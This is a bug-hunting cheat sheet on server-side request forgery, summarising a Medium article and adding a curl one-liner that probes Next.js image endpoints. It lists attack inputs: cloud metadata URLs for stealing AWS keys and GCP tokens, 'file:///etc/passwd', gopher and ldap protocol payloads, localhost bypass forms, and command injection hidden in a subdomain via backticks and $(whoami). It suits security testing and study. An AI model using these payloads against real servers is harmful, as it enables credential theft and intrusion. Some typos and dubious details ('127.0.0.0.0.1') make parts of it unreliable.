# 🧠 SSRF
**SSRF** (Server‑Side Request Forgery) is a vulnerability where you trick a server into making HTTP requests **on your behalf**.  
If the server can be convinced to fetch a URL you control, you can often make it talk to **internal systems** or **cloud metadata services** that you normally can’t reach.

---

## 🔍 Core Idea
- The app has a feature like:
  ```
  GET /api/v1/fetch?url=https://site.com/image.jpeg
  ```
- You change the `url` parameter to something else — not an image, but an **internal address**.
- The server fetches it, and you get the response.

---

## ☁ Cloud Metadata Targets
Cloud providers expose special internal IPs that return **sensitive instance data**:

| Provider | Metadata IP/Host | Example Sensitive Paths |
|----------|------------------|-------------------------|
| AWS | `169.254.169.254` | `/latest/meta-data/iam/security-credentials` (access keys) |
| GCP | `metadata.google.internal` | `/computeMetadata/v1beta1/instance/service-account/default/token` (tokens) |

If you can make the vulnerable server request these, you can steal credentials.

---

## 🛠 Exploitation Flow (from the article)
1. **Test with your Burp Collaborator URL**  
   Replace the `url` param with something like:
   ```
   http://<your-collaborator>.burpcollaborator.net
   ```
   eg: if you have a website like:`http://example.burpcollaporator.net` ⇒ you can make RCE like :

```http://`whoami`.example.burpcollaporator.net``` OR `http://$(whoami).example.burpcollaporator.net`<br>
   If you see an HTTP/DNS hit, SSRF is confirmed.

2. **Pivot to internal targets**  
   Try:
   ```
   http://169.254.169.254/latest/meta-data/
   ```
   or for GCP:
   ```
   http://metadata.google.internal/...
   ```

3. **Grab sensitive data**
   - AWS: IAM role creds, instance identity docs, hostnames.
   - GCP: Access tokens, SSH keys.
   ### sensitive places for SSRF:

- `?url=file:///etc/passwd`
- `?url=gopher://`
- `?url=ssh://` ⇒ RCE
- `?url=dict://` (dictionary network protocol)
- `?url=ftp://` (file transfer protocol)
- `?url=ldap://` (lightweight directory access protocol)
- `?url=tftp://`

---

## 🧩 Tricks Mentioned
- **Alternate localhost forms**: `127.1`, `127.0.0.0.0.1`, `[::]` if `127.0.0.1` is blocked.
- **Other protocols**: `file:///etc/passwd`, `gopher://`, `ftp://`, `ldap://` — sometimes SSRF lets you hit non‑HTTP services.
- **Weird payloads**: Embedding SSRF in SVG, HTML, or media files to trigger server‑side fetches.
- **Command injection via DNS**: Using backticks or `$()` in subdomains to try RCE if the server resolves them.

---

## 📍 Where to Look for SSRF
The article lists common parameter names:
```
url, uri, link, target, dest, destination, page, path, site, file,
feed, proxy, host, domain, callback, webhook, img, photo, avatar,
upload_url, download, resource, api_url, endpoint, reference_url,
server, next, redir, redirect, return
```
Also:
- Certain HTTP headers (`X-Forwarded-Host`, `Origin`, `Host`).
- Full URL paths in requests.
- Inside uploaded files (HTML, SVG, XML) that the server might parse and fetch from.

---

## 🧠 TL;DR in One Sentence
If you can control a URL that the server fetches, you can make it talk to **internal networks** or **cloud metadata endpoints**, potentially leaking credentials or enabling further attacks.

---
[MEDIUM LINK](https://medium.com/@MohammedMHassan/ssrf-7c3f196e8d45)

## Method 2: Image test

One liner ssrf image test<br>
```
curl -sI "https://<target>/_next/image?url=httpbin.org/image/png&w=64…" | grep -E "^HTTP|content-type"
```

1. First, validate the endpoint (does it have the /_next/image?url= parameter?).
2. Quick sweep with an external test URL: curl -sl "https://target/_next/image?url=httpbin.org/image/png&w=64..." → if it returns 200 + image/*, it's vulnerable.
3. Target the internal network: Try AWS metadata (169.254.169.254), localhost, internal IPs.

4. Attempt bypass: encoding, redirects, different formats.

5. Record full request/response with PoC, demonstrate impact (internal data leak, etc.)
